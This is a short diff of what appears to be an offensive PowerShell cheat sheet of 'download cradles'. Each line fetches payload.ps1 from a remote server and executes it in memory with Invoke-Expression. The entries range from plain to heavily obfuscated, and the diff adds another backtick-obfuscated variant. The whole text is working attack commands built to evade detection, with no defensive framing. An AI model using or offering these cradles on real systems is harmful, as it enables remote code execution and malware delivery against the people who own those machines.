@@ -4,6 +4,7 @@ ps> IEX (New-Object Net.Webclient).downloadstring("http://server/payload.ps1")
 
 # Windows PowerShell lightly obfuscated Cradle not proxy aware
 ps> (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')
+ps> i`EX (    neW-o`BJE`cT N`ET.`weBcl`IeNT    )."do`wnLO`ADS`TRinG"(    "http://server/payload.ps1"   )
 
 # Windows PowerShell heavily obfuscated Cradle not proxy aware
 ps> $ExecutionContext|ForEach{(GV _).Value.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|Where-Object{(GV _).Value.Name-ilike'*v*ip*'}).Name)((([Char[]][System.Net.WebClient]::New().DownloadData('http://server/payload.ps1'))-Join''))}
